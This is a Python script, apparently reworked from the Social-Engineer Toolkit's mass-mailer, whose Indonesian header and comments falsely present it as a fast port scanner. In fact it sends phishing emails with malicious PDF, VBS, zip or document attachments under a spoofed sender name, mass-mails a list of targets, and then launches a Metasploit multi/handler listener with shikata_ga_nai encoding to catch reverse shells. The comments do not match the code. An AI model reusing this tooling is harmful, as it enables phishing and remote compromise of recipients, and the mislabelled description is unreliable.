###################################################################
## AUTHOR   : Muhammad Quwais Safutra                            ##
## Request  : Ahmad Maulana                                      ##
## contoh   : netgod -Trojan -PS 8.8.8.8                         ##
## 					DOCUMENTATION                                ##
## ini berfungsi mengatur koneksi menjadi sangat cepat untuk     ##
## scanning port terbuka. tidak seperti nmap.. ini akan sangat   ##
## berguna dan akan memberi tahukan bagaimana cara exploit nya   ##
###################################################################


import smtplib
import os
import getpass
import sys
import subprocess
import re
import glob
import random
import pexpect
import base64
try:
    import _thread as thread
except ImportError:
    import thread 
try:
    from cStringIO import StringIO
except ImportError:
    from io import StringIO

# email berfungsi untuk meng exploit Port terbuka 23
	
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.header import Header
from email.generator import Generator
import email.charset as Charset
import email.encoders as Encoders
sendmail = 0
from src.core.setcore import *
Charset.add_charset('utf-8', Charset.BASE64, Charset.BASE64, 'utf-8')
message_flag = "plain"

for line in sendmail_file:
    line = line.rstrip()
    match = re.search("SENDMAIL=", line)
    if match:
        if line == ("SENDMAIL=ON"):
            print_info(
                "Mengirim Email     : port_23.")
            sendmail_choice = yesno_prompt(["1"], "Scan Port? [yes|no]")
            if sendmail_choice == "YES":
                print_info("[!] Port Scanning ini sangat cepat.. mungkin menggunakan data yang sangat banyak.")
                if os.path.isfile("/GNU"):
                    subprocess.Popen(
                        "/GNU", shell=True).wait()
                if not os.path.isfile("/GNU"):
                    if not os.path.isfile("/GNU"):
                        pause = input("[!] PORT SCAN tidak bisa dilakukan. periksa alamat ip korban anda")
                        sys.exit()
                smtp = ("localhost")
                port = ("25")
                sendmail = 1
                provideruser = ''
                pwd = ''
    match1 = re.search("EMAIL_PROVIDER=", line)
    if match1:

        email_provider = line.replace("EMAIL_PROVIDER=", "").lower()
        if email_provider == "gmail":
            if sendmail == 0:
                smtp = ("smtp.gmail.com")
                port = ("587")
                print_status(
                    "If you are using GMAIL - you will need to need to create an application password: https://support.google.com/accounts/answer/6010255?hl=en")

        # support smtp for yahoo
        if email_provider == "yahoo":
            if sendmail == 0:
                smtp = ("smtp.mail.yahoo.com")
                port = ("587")
        if email_provider == "hotmail":
            if sendmail == 0:
                smtp = ("smtp.live.com")
                port = ("587")

# DEFINE METASPLOIT PATH
meta_path = meta_path()

print_info(
    "As an added bonus, use the file-format creator in SET to create your attachment.")
counter = 0
# PDF Previous
if os.path.isfile(userconfigpath + "template.pdf"):
    if os.path.isfile(userconfigpath + "template.rar"):
        if os.path.isfile(userconfigpath + "template.zip"):
            print_warning("Multiple payloads were detected:")
            print ("1. PDF Payload\n2. VBS Payload\n3. Zipfile Payload\n\n")
            choose_payload = input(setprompt("0", ""))
            if choose_payload == '1':
                file_format = (userconfigpath + "template.pdf")
            if choose_payload == '2':
                file_format = (userconfigpath + "template.rar")
            if choose_payload == '3':
                file_format = (userconfigpath + "template.zip")
            counter = 1

if counter == 0:
    if os.path.isfile(userconfigpath + "template.pdf"):
        file_format = (userconfigpath + "template.pdf")
    if os.path.isfile(userconfigpath + "template.rar"):
        file_format = (userconfigpath + "template.rar")
    if os.path.isfile(userconfigpath + "template.zip"):
        file_format = (userconfigpath + "template.zip")
    if os.path.isfile(userconfigpath + "template.doc"):
        file_format = (userconfigpath + "template.doc")
    if os.path.isfile(userconfigpath + "template.rtf"):
        file_format = (userconfigpath + "template.rtf")
    if os.path.isfile(userconfigpath + "template.mov"):
        file_format = (userconfigpath + "template.mov")

if not os.path.isfile(userconfigpath + "template.pdf"):
    if not os.path.isfile(userconfigpath + "template.rar"):
        if not os.path.isfile(userconfigpath + "template.zip"):
            if not os.path.isfile(userconfigpath + "template.doc"):
                if not os.path.isfile(userconfigpath + "template.rtf"):
                    if not os.path.isfile(userconfigpath + "template.mov"):
                        print("No previous payload created.")
                        file_format = input(
                            setprompt(["1"], "Enter the file to use as an attachment"))
                        if not os.path.isfile("%s" % (file_format)):
                            while 1:
                                print_error("ERROR:FILE NOT FOUND. Try Again.")
                                file_format = input(
                                    setprompt(["1"], "Enter the file to use as an attachment"))
                                if os.path.isfile(file_format):
                                    break

if not os.path.isfile(file_format):
    exit_set()
filename1 = input(setprompt(["1"], ""))
if filename1 == '1' or filename1 == '':
    print_status("Keeping the filename and moving on.")
if filename1 == '2':
    filename1 = input(setprompt(["1"], "New filename"))
    subprocess.Popen("cp %s %s/%s 1> /dev/null 2> /dev/null" %
                     (file_format, userconfigpath, filename1), shell=True).wait()
    file_format = ("%s/%s" % (userconfigpath, filename1))
    print_status("Filename changed, moving on...")

option1 = input(setprompt(["1"], ""))

if option1 == '1' or option1 == '2':
    template_choice = input(setprompt(["1"], ""))
    if template_choice == '1':
        path = 'src/templates/'
        filewrite = open(userconfigpath + "email.templates", "w")
        counter = 0
        for infile in glob.glob(os.path.join(path, '*.template')):
            infile = infile.split("/")
            infile = infile[2]
            counter = counter + 1
            filewrite.write(infile + " " + str(counter) + "\n")
        filewrite.close()
        fileread = open(userconfigpath + "email.templates", "r").readlines()
        print_info("Available templates:")
        for line in fileread:
            line = line.rstrip()
            line = line.split(" ")
            filename = line[0]
            fileread2 = open("src/templates/%s" % (filename), "r").readlines()
            for line2 in fileread2:
                match = re.search("SUBJECT=", line2)
                if match:
                    line2 = line2.rstrip()
                    line2 = line2.split("=")
                    line2 = line2[1]
                    line2 = line2.replace('"', "")
                    print(line[1] + ": " + line2)
        choice = input(setprompt(["1"], ""))
        for line in fileread:
            line = line.split(" ")
            match = re.search(str(choice), line[1])
            if match:
                extract = line[0]
                fileopen = open("src/templates/" +
                                str(extract), "r").readlines()
                for line2 in fileopen:
                    match2 = re.search("SUBJECT=", line2)
                    if match2:
                        subject = line2.replace('"', "")
                        subject = subject.split("=")
                        subject = subject[1]
                    match3 = re.search("BODY=", line2)
                    if match3:
                        body = line2.replace('"', "")
                        body = body.replace(r'\n', " \n ")
                        body = body.split("=")
                        body = body[1]
    if template_choice == '2' or template_choice == '':
        subject = input(setprompt(["1"], "Subject of the email"))
        try:
            html_flag = input(
                setprompt(["1"], "Send the message as html or plain? 'h' or 'p' [p]"))
            if html_flag == "" or html_flag == "p":
                message_flag = "plain"
            if html_flag == "h":
                message_flag = "html"
            body = ""
            body = input(setprompt(
                ["1"], "Enter the body of the message, hit return for a new line. Control+c when finished"))
            while 1:
                try:
                    body += ("\n")
                    body += input("Next line of the body: ")
                except KeyboardInterrupt:
                    break
        except KeyboardInterrupt:
            pass
if option1 == '1':
    to = input(setprompt(["1"], "Send email to"))
if option1 == '2':
    filepath = input(
        setprompt(["1"], "Path to the file to import into SET"))
if option1 == '99':
    exit_set()

print(("""\n  1. Use a %s Account for your email attack.\n  2. Use your own server or open relay\n""" %
      (email_provider)))
relay = input(setprompt(["1"], ""))
counter = 0
if relay == '1':
    provideruser = input(
        setprompt(["1"], ("Your %s email address" % email_provider)))
    from_address = provideruser
    from_displayname = input(
        setprompt(["1"], "The FROM NAME user will see"))
    pwd = getpass.getpass("Email password: ")
if relay == '2':
    from_address = input(
        setprompt(["1"], "From address (ex: moo@example.com)"))
    from_displayname = input(
        setprompt(["1"], "The FROM NAME user will see"))
    if sendmail == 0:
        provideruser = input(
            setprompt(["1"], "Username for open-relay [blank]"))
        pwd = getpass.getpass("Password for open-relay [blank]: ")

    if sendmail == 0:
        smtp = input(setprompt(
            ["1"], "SMTP email server address (ex. smtp.youremailserveryouown.com)"))
        port = input(
            setprompt(["1"], "Port number for the SMTP server [25]"))
        if port == "":
            port = ("25")

highpri = yesno_prompt(["1"], "Flag this message/s as high priority? [yes|no]")
if not "YES" in highpri:
    prioflag1 = ""
    prioflag2 = ""
else:
    prioflag1 = ' 1 (Highest)'
    prioflag2 = ' High'
def mail(to, subject, text, attach, prioflag1, prioflag2):
    msg = MIMEMultipart()
    msg['From'] = str(
        Header(from_displayname, 'UTF-8').encode() + ' <' + from_address + '> ')
    msg['To'] = to
    msg['X-Priority'] = prioflag1
    msg['X-MSMail-Priority'] = prioflag2
    msg['Subject'] = Header(subject, 'UTF-8').encode()
    body_type = MIMEText(text, "%s" % (message_flag), 'UTF-8')
    msg.attach(body_type)
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(open(attach, 'rb').read())
    Encoders.encode_base64(part)
    part.add_header('Content-Disposition',
                    'attachment; filename="%s"' % os.path.basename(attach))
    msg.attach(part)

    io = StringIO()
    msggen = Generator(io, False)
    msggen.flatten(msg)
    mailServer = smtplib.SMTP(smtp, int(port))
    mailServer.ehlo()
    if sendmail == 0:
        if email_provider == "gmail" or email_provider == "yahoo":
            mailServer.ehlo()
            try:
                mailServer.starttls()
            except:
                pass
            mailServer.ehlo()
    if not "gmail|yahoo|hotmail|" in email_provider: 
        tls = yesno_prompt(["1"], "Does your server support TLS? [yes|no]")
        if tls == "YES":
            mailServer.starttls()
    if counter == 0:
        try:
            if email_provider == "gmail" or email_provider == "yahoo" or email_provider == "hotmail":
                try:
                    mailServer.starttls()
                except:
                    pass
                mailServer.ehlo()
                if len(provideruser) > 0:
                    mailServer.login(provideruser, pwd)
                mailServer.sendmail(from_address, to, io.getvalue())
        except Exception as e:
            print_error(
                "Unable to deliver email. Printing exceptions message below, this is most likely due to an illegal attachment. If using GMAIL they inspect PDFs and is most likely getting caught.")
            input("Press {return} to view error message.")
            print(str(e))
            try:
                mailServer.docmd("AUTH LOGIN", base64.b64encode(provideruser))
                mailServer.docmd(base64.b64encode(pwd), "")
            except Exception as e:
                print(str(e))
                try:
                    mailServer.login(provideremail, pwd)
                    thread.start_new_thread(mailServer.sendmail(
                        from_address, to, io.getvalue()))
                except Exception as e:
                    return_continue()

    if email_provider == "hotmail":
        mailServer.login(provideruser, pwd)
        thread.start_new_thread(mailServer.sendmail,
                                (from_address, to, io.getvalue()))

    if sendmail == 1:
        thread.start_new_thread(mailServer.sendmail,
                                (from_address, to, io.getvalue()))

if option1 == '1':
    try:
        mail("%s" % (to), subject, body, "%s" %
             (file_format), prioflag1, prioflag2)
    except socket.error:
        print_status(
            "Unable to connect to mail server. Try again (Internet issues?)")

if option1 == '2':
    counter = 0
    email_num = 0
    fileopen = open(filepath, "r").readlines()
    for line in fileopen:
        to = line.rstrip()
        mail("%s" % (to),
             subject,
             body,
             "%s" % (file_format), prioflag1, prioflag2)
        email_num = email_num + 1
        print("   Sent e-mail number: " + (str(email_num)))

if not os.path.isfile(userconfigpath + "template.zip"):
    print_status("SET has finished delivering the emails")
    question1 = yesno_prompt(["1"], "Setup a listener [yes|no]")
    if question1 == 'YES':
        if not os.path.isfile(userconfigpath + "payload.options"):
            if not os.path.isfile(userconfigpath + "meta_config"):
                if not os.path.isfile(userconfigpath + "unc_config"):
                    print_error(
                        "Sorry, you did not generate your payload through SET, this option is not supported.")
        if os.path.isfile(userconfigpath + "unc_config"):
            child = pexpect.spawn(
                "%smsfconsole -r %s/unc_config" % (meta_path, userconfigpath))
            try:
                child.interact()
            except Exception:
                child.close()

        if os.path.isfile(userconfigpath + "payload.options"):
            fileopen = open(userconfigpath + "payload.options", "r").readlines()
            for line in fileopen:
                line = line.rstrip()
                line = line.split(" ")
            filewrite = open(userconfigpath + "meta_config", "w")
            filewrite.write("use exploit/multi/handler\n")
            filewrite.write("set PAYLOAD " + line[0] + "\n")
            filewrite.write("set LHOST " + line[1] + "\n")
            filewrite.write("set LPORT " + line[2] + "\n")
            filewrite.write("set ENCODING shikata_ga_nai\n")
            filewrite.write("set ExitOnSession false\n")
            filewrite.write("exploit -j\r\n\r\n")
            filewrite.close()
            child = pexpect.spawn(
                "%smsfconsole -r %s/meta_config" % (meta_path, userconfigpath))
            try:
                child.interact()
            except Exception:
                child.close()
